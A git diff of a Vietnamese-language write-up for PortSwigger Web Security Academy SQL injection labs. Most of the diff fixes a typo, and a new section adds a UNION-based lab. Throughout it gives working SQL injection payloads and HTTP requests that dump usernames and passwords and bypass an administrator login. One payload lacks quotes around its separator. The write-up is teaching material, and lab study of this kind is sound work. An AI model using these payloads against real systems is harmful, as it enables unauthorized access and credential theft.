@@ -99,7 +99,7 @@ csrf=FeKN7j0LMwFrA9s7ph9bXzk0ZcoxiAIZ&username=administrator%27+--&password=abc
 
 Phòng thí nghiệm này chứa lỗ hổng SQL trong bộ lọc danh mục sản phẩm, khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:
 ```sql
-SELECT field1, field2, ..., fieldn FROM products WHERE category = 'category_nane' ...
+SELECT field1, field2, ..., fieldn FROM products WHERE category = 'category_name' ...
 ```
 
 #### Specify the number of columns
@@ -156,7 +156,7 @@ Result:
 
 Phòng thí nghiệm này chứa lỗ hổng SQL trong bộ lọc danh mục sản phẩm, khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:
 ```sql
-SELECT field1, field2, ..., fieldn FROM products WHERE category = 'category_nane' ...
+SELECT field1, field2, ..., fieldn FROM products WHERE category = 'category_name' ...
 ```
 
 #### Specify the number of columns
@@ -208,7 +208,7 @@ Result:
 
 Phòng thí nghiệm này chứa lỗ hổng SQL trong bộ lọc danh mục sản phẩm, khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:
 ```sql
-SELECT field1, field2, ..., fieldn FROM products WHERE category = 'category_nane' ...
+SELECT field1, field2, ..., fieldn FROM products WHERE category = 'category_name' ...
 ```
 
 Ứng dụng có chức năng đăng nhập và cơ sở dữ liệu chứa một bảng lưu trữ tên người dùng và mật khẩu. Bạn cần xác định tên của bảng này và các cột mà nó chứa, sau đó truy xuất nội dung của bảng để lấy tên người dùng và mật khẩu của tất cả người dùng.
@@ -291,7 +291,7 @@ Hoàn thành lab bằng cách đăng nhập bằng tài khoản `administrator`.
 
 Phòng thí nghiệm này chứa lỗ hổng SQL trong bộ lọc danh mục sản phẩm, khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:
 ```sql
-SELECT field1, field2, ..., fieldn FROM products WHERE category = 'category_nane' ...
+SELECT field1, field2, ..., fieldn FROM products WHERE category = 'category_name' ...
 ```
 
 Thực hiện tương tự bài lab trên nhưng sử dụng các cú pháp của **Oracle**.
@@ -374,7 +374,7 @@ Hoàn thành lab bằng cách đăng nhập bằng tài khoản `administrator`.
 
 Phòng thí nghiệm này chứa lỗ hổng SQL trong bộ lọc danh mục sản phẩm, khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:
 ```sql
-SELECT field1, field2, ..., fieldn FROM products WHERE category = 'category_nane' ...
+SELECT field1, field2, ..., fieldn FROM products WHERE category = 'category_name' ...
 ```
 
 Payload:
@@ -404,7 +404,7 @@ Nếu server không trả về lỗi là đã thành công!
 
 Phòng thí nghiệm này chứa lỗ hổng SQL trong bộ lọc danh mục sản phẩm, khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:
 ```sql
-SELECT field1, field2, ..., fieldn FROM products WHERE category = 'category_nane' ...
+SELECT field1, field2, ..., fieldn FROM products WHERE category = 'category_name' ...
 ```
 
 #### Check number of column
@@ -424,6 +424,7 @@ SELECT field1, field2, field3 FROM products WHERE category = '' UNION SELECT NUL
 ```
 
 Request:
+
 ```http
 GET /filter?category='+UNION+SELECT+NULL,'abc',NULL-- HTTP/2
 Host: 0aac00f304cd312981790cd700d50010.web-security-academy.net
@@ -434,7 +435,7 @@ Host: 0aac00f304cd312981790cd700d50010.web-security-academy.net
 
 Phòng thí nghiệm này chứa lỗ hổng SQL trong bộ lọc danh mục sản phẩm, khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:
 ```sql
-SELECT field1, field2, ..., fieldn FROM products WHERE category = 'category_nane' ...
+SELECT field1, field2, ..., fieldn FROM products WHERE category = 'category_name' ...
 ```
 
 Cơ sở dữ liệu chứa một bảng khác được gọi là `users`, với các cột được gọi là `username` và `password`.
@@ -457,6 +458,7 @@ SELECT field1, field2 FROM products WHERE category = '' UNION SELECT username,pa
 ```
 
 Request:
+
 ```http
 GET /filter?category='+UNION+SELECT+username,password+FROM+users-- HTTP/2
 Host: 0a5000b204d472c880cdd01700d80031.web-security-academy.net
@@ -464,6 +466,41 @@ Host: 0a5000b204d472c880cdd01700d80031.web-security-academy.net
 
 ### Lab: SQL injection UNION attack, retrieving multiple values in a single column
 > Mục tiêu: đăng nhập với tư cách `administrator`.
+
+Phòng thí nghiệm này chứa lỗ hổng SQL trong bộ lọc danh mục sản phẩm, khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:
+```sql
+SELECT field1, field2, ..., fieldn FROM products WHERE category = 'category_name' ...
+```
+Cơ sở dữ liệu chứa một bảng khác được gọi là `users`, với các cột được gọi là `username` và `password`.
+Thực hiện một cuộc tấn công **UNION** SQL Injection truy xuất tất cả các `username` và `password` và sử dụng thông tin để đăng nhập với tư cách là `administrator`.
+
+#### Check number of column && Check column contain string
+Cũng thự hiện tương tự 2 lab trên, nhưng ở đây chỉ có 1 trường chứa kiểu `string`. Vì thế chỉ có thể hiển thị nội dung của 1 trương `username` hoặc `password`.
+> Ý tưởng: Gộp `username` và `password` vào chung 1 trường.
+
+Payload:
+```
+' UNION SELECT NULL,CONCAT(username,||,password) FROM users--
+```
+
+Ta sử dụng hàm **CONCAT()** để gộp nội dung các cột lại với nhau. Nối `username` và `password`, dùng `||` để tách biệt nó ra cho dễ quan sát, dữ liệu hiển thị ở dạng `wiener||wiener_password`
+
+Câu truy vấn sẽ được thay thế thành:
+```sql
+SELECT field1, field2 FROM products WHERE category = '' UNION SELECT NULL,CONCAT(username,||,password) FROM users--' ...
+```
+
+Request:
+
+```http
+GET /filter?category='+UNION+SELECT+NULL,CONCAT(username,'||',password)+FROM+users-- HTTP/2
+Host: 0a1400560347179d818bacde006400a6.web-security-academy.net
+```
+
+Lấy thông tin đăng nhập của `administrator` và đăng nhập.
+
+### 
+
 
 ---
 Goodluck! 🍀🍀🍀
